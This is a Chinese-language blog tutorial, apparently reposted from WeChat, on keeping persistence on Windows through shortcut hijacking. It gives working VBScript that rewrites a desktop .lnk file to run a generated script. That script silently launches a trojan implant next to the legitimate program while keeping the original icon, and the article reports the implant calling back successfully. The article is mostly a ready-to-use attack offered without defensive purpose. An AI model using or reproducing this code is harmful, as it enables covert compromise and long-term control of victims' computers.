<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Kj3xsQgoo0CFbfHZikCwAA)

这种方式我觉得挺好用的，且不需要管理员权限，我们都知道 lnk 文件可以指向一个 exe 文件，相当于一个快捷方式，所以我们可以更改指向的文件，指向我们的 exe 文件，但是这样的话原本的 lnk 文件就没用了，所以我们可以 CreateShortcut 方法来创建 lnk 快捷方式，在不损坏其原始 lnk 文件的情况下且可以执行我们的恶意文件。

  
如下 vbs 代码:

```
implant = "C:\tasks\恶意木马.exe"
newTarget = "C:\tasks\beacon.vbs"
lnkName = "C:\Users\Admin\Desktop\xxx.exe.lnk"
set WshShell = WScript.CreateObject("WScript.Shell" )
strDesktop = WshShell.SpecialFolders("Desktop" )
set oShellLink = WshShell.CreateShortcut(strDesktop & "\" & lnkName )
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(newTarget,True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & implant & chr(34) & vbCrLf
File.Write "oShell.Run " & chr(34) & oShellLink.TargetPath & " " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close
oShellLink.TargetPath = newTarget
oShellLink.IconLocation = origTarget & ", 0"
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save

```

脚本如下：

大概意思就是从桌面去获取到. lnk 文件，然后更改其指向的目标文件，这种方法需要通过创建一个 vbs 文件来进行完成，这个 vbs 文件会执行原始文件和我们的木马文件。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqiakky4nAnMbAHpAjoSM92zrrTfRR3ib6THAg7URlhcVLia7O5aDt0qtG1UcnRdEEoR9NOS5EIfd2UA/640?wx_fmt=png&from=appmsg)

```
wscrip pro.vbs

```

现在 putty.exe.lnk 文件已经被修改了。

可以看到文件指向的目标就是我们的 beacon.vbs 文件了。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqiakky4nAnMbAHpAjoSM92z23nuw7StDWgMBHdvUoFIJNqNjG4I9tT62ibA48UgRD05SAyQibaI4goQ/640?wx_fmt=png&from=appmsg)

而执行 beacon.vbs 文件，就会执行原始的程序以及我们的木马文件。

可以看到成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqiakky4nAnMbAHpAjoSM92zo8fjAhYksGlYDVZZTUVHPn4X3tg2OLCYNXq04XAthW0CX0SEyGm2og/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqiakky4nAnMbAHpAjoSM92zzFRFKRCMcIe12901mfJYSwwYQQrw9sX2yHbO0ytvwgtPsVlQDopAjw/640?wx_fmt=png&from=appmsg)

本节就先到这里，期待和您的下次相遇！！！